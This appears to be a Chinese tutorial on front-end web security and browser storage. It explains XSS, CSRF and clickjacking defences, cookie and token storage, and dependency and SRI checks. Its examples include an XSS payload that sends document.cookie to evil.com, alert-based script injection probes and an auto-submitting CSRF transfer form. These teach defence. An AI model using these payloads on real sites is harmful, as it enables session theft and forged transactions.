# 前端安全与浏览器存储

## XSS（跨站脚本攻击）

XSS（Cross-Site Scripting）攻击的本质是将恶意脚本注入到受信任的网页中，在其他用户的浏览器上执行。

### 反射型 XSS

恶意脚本通过 URL 参数注入，服务器直接将参数拼接到 HTML 中返回：

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

如果服务端未转义直接输出：

```html
<!-- 服务端模板 -->
<p>搜索结果：<%- query %></p>

<!-- 实际输出 -->
<p>搜索结果：<script>alert(document.cookie)</script></p>
```

### 存储型 XSS

恶意脚本被存储到数据库中，所有访问该页面的用户都会被执行。常见于评论区、个人资料、文章内容等用户可输入的地方。

```js
// 攻击者提交的评论内容
const comment = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';
```

### DOM 型 XSS

不经过服务端，前端 JS 直接将用户输入写入 DOM：

```js
// 危险写法
const name = new URLSearchParams(location.search).get("name");
document.getElementById("greeting").innerHTML = `你好，${name}`;

// 攻击 URL
// https://example.com?name=<img src=x onerror=alert(1)>
```

## XSS 防护

### 输出编码

对所有用户输入进行转义后再输出到 HTML：

```js
function escapeHtml(str) {
  const map = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
  };
  return str.replace(/[&<>"']/g, (c) => map[c]);
}

// 使用
document.getElementById("greeting").textContent = `你好，${name}`;
// 或
document.getElementById("greeting").innerHTML = `你好，${escapeHtml(name)}`;
```

Vue 中默认对 `{{ }}` 插值做了 HTML 转义，但 `v-html` 指令不会转义，应避免使用：

```vue
<!-- 安全 -->
<p>{{ userInput }}</p>

<!-- 危险，避免使用 -->
<p v-html="userInput"></p>
```

React 中 JSX 默认也会转义，但使用 `dangerouslySetInnerHTML` 时需要自行确保安全：

```jsx
// 危险
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

### Content-Security-Policy（CSP）

CSP 是防御 XSS 的最强手段，通过 HTTP 头限制页面可以加载和执行的资源来源：

```nginx
# 只允许加载同源脚本，禁止内联脚本
add_header Content-Security-Policy
    "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; font-src 'self';" always;
```

CSP 指令说明：

| 指令 | 作用 | 示例 |
|------|------|------|
| `script-src` | 控制 JS 脚本来源 | `'self' https://cdn.example.com` |
| `style-src` | 控制 CSS 来源 | `'self' 'unsafe-inline'` |
| `img-src` | 控制图片来源 | `'self' data: https:` |
| `connect-src` | 控制 XHR/fetch 请求来源 | `'self' https://api.example.com` |
| `frame-src` | 控制 iframe 来源 | `'none'` |
| `frame-ancestors` | 控制谁可以嵌入当前页面 | `'self'` |

如果需要允许内联脚本（不推荐），可以使用 nonce：

```nginx
add_header Content-Security-Policy
    "script-src 'self' 'nonce-abc123';" always;
```

```html
<script nonce="abc123">
  // 只有带 nonce 的 script 标签才能执行
</script>
```

### HttpOnly Cookie

设置 `HttpOnly` 属性后，JavaScript 无法通过 `document.cookie` 读取该 Cookie，可有效防止 XSS 窃取会话令牌：

```http
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
```

## CSRF（跨站请求伪造）

CSRF 攻击利用用户已登录的身份，诱导用户在不知情的情况下发送恶意请求。

### 攻击原理

1. 用户登录 `bank.com`，浏览器保存了会话 Cookie
2. 用户访问恶意网站 `evil.com`
3. `evil.com` 页面中包含一个自动提交的表单：

```html
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById("csrf-form").submit();</script>
```

4. 浏览器自动附带 `bank.com` 的 Cookie，请求被视为合法

### SameSite Cookie

`SameSite` 属性是防御 CSRF 的现代方案：

```http
Set-Cookie: session_id=abc123; SameSite=Strict; Secure; HttpOnly
```

| 值 | 行为 | 适用场景 |
|----|------|---------|
| `Strict` | 跨站请求完全不发送 Cookie | 银行、支付等高安全场景 |
| `Lax`（默认） | 跨站 GET 请求发送，POST 不发送 | 大多数 Web 应用 |
| `None` | 跨站请求也发送 Cookie（必须配合 `Secure`） | 需要跨域携带 Cookie 的场景 |

### CSRF Token

在表单或请求头中携带服务端生成的随机 Token：

```html
<!-- 服务端渲染表单时注入 Token -->
<form method="POST" action="/api/transfer">
  <input type="hidden" name="_csrf" value="xK9mN2pL5qR8tY3w" />
  <!-- 其他表单字段 -->
</form>
```

前后端分离项目中，通常通过响应头下发 Token，前端在后续请求中携带：

```js
// 后端响应头
// X-CSRF-Token: xK9mN2pL5qR8tY3w

// 前端 axios 拦截器自动携带
axios.interceptors.request.use((config) => {
  const token = document.querySelector('meta[name="csrf-token"]')?.content;
  if (token) {
    config.headers["X-CSRF-Token"] = token;
  }
  return config;
});
```

## 点击劫持

点击劫持（Clickjacking）通过在透明 iframe 中嵌入目标网站，诱导用户点击。

### X-Frame-Options

```nginx
# 只允许同源页面嵌入
add_header X-Frame-Options "SAMEORIGIN" always;

# 完全禁止嵌入
add_header X-Frame-Options "DENY" always;
```

### frame-ancestors CSP

CSP 的 `frame-ancestors` 是 `X-Frame-Options` 的现代替代：

```nginx
# 只允许同源嵌入
add_header Content-Security-Policy "frame-ancestors 'self';" always;

# 允许指定域名嵌入
add_header Content-Security-Policy "frame-ancestors 'self' https://trusted.com;" always;
```

## 前端数据存储

浏览器提供了多种客户端存储方案，适用于不同场景。

### localStorage

持久化存储，数据不会过期，关闭浏览器后依然存在。同源的所有标签页共享数据。

```js
// 存储（只能存字符串）
localStorage.setItem("theme", "dark");
localStorage.setItem("user", JSON.stringify({ name: "Alice", age: 25 }));

// 读取
const theme = localStorage.getItem("theme");
const user = JSON.parse(localStorage.getItem("user"));

// 删除
localStorage.removeItem("theme");

// 清空当前域名下所有存储
localStorage.clear();
```

### sessionStorage

与 `localStorage` API 相同，但数据仅在当前标签页（会话）中有效。关闭标签页后数据清除，不同标签页之间不共享。

```js
sessionStorage.setItem("scrollPosition", window.scrollY);
const pos = sessionStorage.getItem("scrollPosition");
```

### Cookie

Cookie 是最早期的客户端存储方案，容量小（约 4KB），会随每次 HTTP 请求自动发送。

```js
// 写入
document.cookie = "username=Alice; max-age=86400; path=/; SameSite=Lax";

// 读取
const cookies = document.cookie.split(";").reduce((acc, cookie) => {
  const [key, value] = cookie.trim().split("=");
  acc[key] = value;
  return acc;
}, {});
```

### IndexedDB

浏览器内置的 NoSQL 数据库，支持大量结构化数据存储（通常数百 MB 以上），异步 API，支持事务和索引。

```js
// 打开/创建数据库
const request = indexedDB.open("myDatabase", 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  const store = db.createObjectStore("articles", { keyPath: "id" });
  store.createIndex("title", "title", { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;

  // 写入
  const tx = db.transaction("articles", "readwrite");
  const store = tx.objectStore("articles");
  store.put({ id: 1, title: "Hello World", content: "..." });

  // 读取
  const getReq = store.get(1);
  getReq.onsuccess = () => {
    console.log(getReq.result);
  };
};
```

推荐使用 `idb` 或 `Dexie.js` 等封装库简化操作：

```js
import Dexie from "dexie";

const db = new Dexie("myDatabase");
db.version(1).stores({
  articles: "id, title, createdAt",
});

// 写入
await db.articles.put({ id: 1, title: "Hello", createdAt: Date.now() });

// 查询
const recent = await db.articles.where("createdAt").above(Date.now() - 86400000).toArray();
```

## 各存储方案对比

| 特性 | localStorage | sessionStorage | Cookie | IndexedDB |
|------|-------------|----------------|--------|-----------|
| 容量 | ~5-10MB | ~5-10MB | ~4KB | 数百 MB+ |
| 过期策略 | 永不过期 | 标签页关闭 | 可设置 max-age/Expires | 永不过期 |
| 作用域 | 同源、所有标签页 | 同源、单个标签页 | 同源、可设置 Path/Domain | 同源 |
| 随请求发送 | 否 | 否 | 是 | 否 |
| API 同步/异步 | 同步 | 同步 | 同步 | 异步 |
| 适用场景 | 主题、语言偏好 | 表单草稿、临时状态 | 会话认证、跟踪 | 离线数据、大量缓存 |

## Cookie 属性

```http
Set-Cookie: name=value; Domain=example.com; Path=/; Max-Age=86400; Secure; HttpOnly; SameSite=Lax
```

| 属性 | 说明 |
|------|------|
| `Domain` | Cookie 所属域名。不设置则默认当前域，子域不可访问。设置后子域可访问 |
| `Path` | Cookie 路径作用域，只有路径匹配的请求才会携带 |
| `Max-Age` | 过期时间（秒）。不设置则为会话 Cookie，关闭浏览器后删除 |
| `Expires` | 过期时间点（GMT 格式），与 `Max-Age` 二选一 |
| `Secure` | 只在 HTTPS 连接下发送 |
| `HttpOnly` | 禁止 JavaScript 访问，防止 XSS 窃取 |
| `SameSite` | 限制跨站请求携带，可选 `Strict` / `Lax` / `None` |

## Token 存储方案

前后端分离项目中，JWT Token 的存储是一个经典的安全与便利的权衡问题。

### localStorage

```js
localStorage.setItem("token", jwt);
// 请求时手动添加
headers: { Authorization: `Bearer ${token}` }
```

- **优点**：简单，不受同源请求大小限制
- **缺点**：容易被 XSS 攻击读取

### Cookie（HttpOnly）

```http
Set-Cookie: token=eyJhbGci...; HttpOnly; Secure; SameSite=Strict; Path=/
```

- **优点**：JavaScript 无法读取，天然防 XSS
- **缺点**：需要防 CSRF，跨域场景配置复杂

### 内存

```js
let token = null;

export function setToken(t) {
  token = t;
}

export function getToken() {
  return token;
}
```

- **优点**：最安全，XSS 无法持久化读取
- **缺点**：刷新页面后 Token 丢失，需要配合 Refresh Token 机制

### 对比

| 方案 | 安全性 | 便利性 | 刷新保持 | 跨域支持 |
|------|--------|--------|---------|---------|
| localStorage | 低（XSS 可读取） | 高 | 是 | 是 |
| Cookie HttpOnly | 高（JS 不可读） | 中 | 是 | 需配置 CORS |
| 内存 | 最高 | 低（刷新丢失） | 否 | 是 |

对于安全要求高的项目（如金融、医疗），推荐 Cookie HttpOnly + CSRF Token 的组合。对于一般的博客或内容管理系统，localStorage + 短有效期 Token 是更实际的选择。

## 安全编码实践

### 避免 innerHTML

```js
// 危险：直接插入未转义内容
element.innerHTML = userInput;

// 安全：使用 textContent
element.textContent = userInput;

// 安全：使用 DOM API 创建元素
const div = document.createElement("div");
div.textContent = userInput;
parent.appendChild(div);
```

### URL 编码

用户输入用于 URL 时必须编码：

```js
// 危险
window.location = `/search?q=${userInput}`;

// 安全
window.location = `/search?q=${encodeURIComponent(userInput)}`;
```

### 文件名消毒

上传文件时对文件名进行消毒：

```js
function sanitizeFilename(filename) {
  // 移除路径分隔符和特殊字符
  return filename
    .replace(/[\/\\:*?"<>|]/g, "")
    .replace(/\.{2,}/g, ".")
    .replace(/^\.+/, "")
    .substring(0, 255);
}
```

## 依赖安全

### npm audit

```bash
# 检查依赖中的已知漏洞
npm audit

# 自动修复（只修改 package-lock.json）
npm audit fix

# 强制修复（可能修改 package.json 中的版本范围）
npm audit fix --force

# 以 JSON 格式输出，便于 CI 解析
npm audit --json
```

### Snyk

Snyk 提供更全面的依赖扫描和修复建议：

```bash
# 安装 Snyk CLI
npm install -g snyk

# 扫描项目
snyk test

# 持续监控（绑定到 Snyk 控制台）
snyk monitor
```

GitHub 项目中集成 Snyk：

```yaml
# .github/workflows/snyk.yml
- uses: snyk/actions/node@master
  with:
    args: --severity-threshold=high
  env:
    SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

### Dependabot

GitHub 原生的依赖自动更新工具，在 `.github/dependabot.yml` 中配置：

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "my-team"
    labels:
      - "dependencies"
    allow:
      - dependency-type: "production"
```

Dependabot 会在发现依赖更新时自动创建 PR，团队只需 review 和合并。

## Subresource Integrity（SRI）

SRI 用于校验从 CDN 加载的资源是否被篡改。通过在 `<script>` 或 `<link>` 标签上添加 `integrity` 属性，浏览器会计算资源的 hash 值并与预期值对比：

```html
<script
  src="https://cdn.example.com/vue.global.prod.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"
></script>

<link
  rel="stylesheet"
  href="https://cdn.example.com/element-plus/dist/index.css"
  integrity="sha384-def456..."
  crossorigin="anonymous"
/>
```

生成 SRI hash：

```bash
# 使用 openssl
cat file.js | openssl dgst -sha384 -binary | openssl base64 -A

# 使用 sri-toolbox CLI
npx sri --algorithm sha384 file.js

# 在线工具
# https://www.srihash.org/
```

多个 hash 值可以同时提供，浏览器会依次尝试：

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-hash1 sha256-hash2"
  crossorigin="anonymous"
></script>
```

SRI 的局限性：如果 CDN 资源频繁更新，每次更新都需要同步更新 HTML 中的 hash 值。对于使用内容 hash 的 Vite 构建产物，文件名本身就是校验，SRI 的价值有限。但对于第三方 CDN 引入的库（如 unpkg、jsdelivr），SRI 是防止供应链攻击的有效手段。
